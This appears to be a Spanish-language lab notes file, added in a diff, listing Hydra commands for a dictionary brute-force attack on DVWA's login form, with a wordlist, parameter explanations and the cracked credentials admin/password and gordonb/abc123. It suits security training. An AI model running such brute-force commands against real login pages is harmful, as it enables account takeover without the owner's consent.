@@ -1,0 +1,56 @@
+========================================
+COMANDOS DE HYDRA UTILIZADOS
+========================================
+
+1. INSTALAR HYDRA EN WSL (Ubuntu)
+-----------------------------------
+sudo apt update
+sudo apt install hydra -y
+
+2. VERIFICAR INSTALACIÓN
+-------------------------
+hydra -h
+hydra -V
+
+3. VERIFICAR LA IP DE WINDOWS DESDE WSL
+-----------------------------------------
+ip route | grep default
+# Resultado: 172.17.208.1
+
+4. CREAR EL DICCIONARIO DE CONTRASEÑAS
+----------------------------------------
+printf 'password\n123456\n12345678\nqwerty\n123456789\n12345\n1234\n111111\n1234567\ndragon\n123123\nbaseball\nabc123\nfootball\nmonkey\nletmein\n696969\nshadow\nmaster\n666666\n' > /home/gabri/wordlists/passwords.txt
+
+5. VERIFICAR EL DICCIONARIO
+----------------------------
+cat /home/gabri/wordlists/passwords.txt
+
+6. COMANDO DE HYDRA PARA ATACAR DVWA
+--------------------------------------
+hydra -l admin -P /home/gabri/wordlists/passwords.txt 172.17.208.1 -s 4280 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\:security=low\;PHPSESSID=cdb7525132853f92383a9fa19e4430b9"
+
+7. COMANDO CON -t 1 -V (para evitar falsos positivos)
+-------------------------------------------------------
+hydra -l admin -P /home/gabri/wordlists/passwords.txt -t 1 -V 172.17.208.1 -s 4280 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\:security=low\;PHPSESSID=cdb7525132853f92383a9fa19e4430b9"
+
+8. COMANDO CONTRA GORDONB
+--------------------------
+hydra -l gordonb -P /home/gabri/wordlists/passwords.txt -t 1 -V 172.17.208.1 -s 4280 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\:security=low\;PHPSESSID=cdb7525132853f92383a9fa19e4430b9"
+
+========================================
+EXPLICACIÓN DE PARÁMETROS:
+- -l admin: usuario fijo
+- -P archivo: diccionario de contraseñas
+- 172.17.208.1: IP de Windows desde WSL
+- -s 4280: puerto de DVWA
+- http-get-form: módulo para formularios GET
+- ^USER^ y ^PASS^: marcadores de Hydra
+- S=Welcome: condición de éxito
+- H=Cookie: cabecera con PHPSESSID y security
+- -t 1: una sola tarea en paralelo
+- -V: modo verbose
+
+RESULTADOS:
+- admin / password (encontrado en el intento 1)
+- gordonb / abc123 (encontrado en el intento 13)
+========================================
